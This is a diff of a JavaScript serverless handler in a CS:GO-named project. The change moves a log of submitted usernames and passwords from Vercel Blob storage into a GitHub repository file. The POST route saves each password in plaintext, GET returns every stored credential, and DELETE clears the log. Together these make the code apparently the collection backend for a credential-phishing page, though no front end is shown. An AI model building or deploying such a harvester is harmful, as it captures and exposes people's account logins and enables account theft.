@@ -1,25 +1,61 @@
-import { head, put } from '@vercel/blob';
+const GITHUB_OWNER = 'hillwebworks';
+const GITHUB_REPO = 'csgo-brown';
+const FILE_PATH = 'data/submissions.json';
 
-const BLOB_PATH = 'submissions/log.json';
-
-async function readLog() {
-  try {
-    const meta = await head(BLOB_PATH);
-    const response = await fetch(meta.url);
-    if (!response.ok) return [];
-    const data = await response.json();
-    return Array.isArray(data) ? data : [];
-  } catch {
-    return [];
-  }
+function githubHeaders() {
+  const token = process.env.GITHUB_TOKEN;
+  if (!token) throw new Error('GITHUB_TOKEN is not configured');
+  return {
+    Authorization: `Bearer ${token}`,
+    Accept: 'application/vnd.github+json',
+    'X-GitHub-Api-Version': '2022-11-28',
+    'User-Agent': 'csgo-brown-api',
+  };
 }
 
-async function writeLog(entries) {
-  await put(BLOB_PATH, JSON.stringify(entries), {
-    access: 'public',
-    allowOverwrite: true,
-    contentType: 'application/json',
-  });
+async function readLog() {
+  const response = await fetch(
+    `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${FILE_PATH}`,
+    { headers: githubHeaders() }
+  );
+
+  if (response.status === 404) {
+    return { submissions: [], sha: null };
+  }
+
+  if (!response.ok) {
+    const detail = await response.text();
+    throw new Error(`GitHub read failed (${response.status}): ${detail}`);
+  }
+
+  const file = await response.json();
+  const decoded = JSON.parse(Buffer.from(file.content, 'base64').toString('utf8'));
+  const submissions = Array.isArray(decoded) ? decoded : decoded.submissions || [];
+
+  return { submissions, sha: file.sha };
+}
+
+async function writeLog(submissions, sha) {
+  const payload = {
+    message: `Update submissions log (${submissions.length} entries)`,
+    content: Buffer.from(JSON.stringify(submissions, null, 2)).toString('base64'),
+  };
+
+  if (sha) payload.sha = sha;
+
+  const response = await fetch(
+    `https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/contents/${FILE_PATH}`,
+    {
+      method: 'PUT',
+      headers: { ...githubHeaders(), 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+    }
+  );
+
+  if (!response.ok) {
+    const detail = await response.text();
+    throw new Error(`GitHub write failed (${response.status}): ${detail}`);
+  }
 }
 
 export default async function handler(req, res) {
@@ -33,8 +69,8 @@ export default async function handler(req, res) {
 
   try {
     if (req.method === 'GET') {
-      const submissions = await readLog();
-      return res.status(200).json({ submissions, source: 'blob' });
+      const { submissions } = await readLog();
+      return res.status(200).json({ submissions, source: 'github' });
     }
 
     if (req.method === 'POST') {
@@ -44,7 +80,7 @@ export default async function handler(req, res) {
         return res.status(400).json({ error: 'username and password required' });
       }
 
-      const submissions = await readLog();
+      const { submissions, sha } = await readLog();
       const entry = {
         username: String(username).trim(),
         password: String(password),
@@ -53,13 +89,14 @@ export default async function handler(req, res) {
       };
 
       submissions.unshift(entry);
-      await writeLog(submissions);
+      await writeLog(submissions, sha);
 
       return res.status(201).json({ ok: true, count: submissions.length, entry });
     }
 
     if (req.method === 'DELETE') {
-      await writeLog([]);
+      const { sha } = await readLog();
+      await writeLog([], sha);
       return res.status(200).json({ ok: true, count: 0 });
     }
 
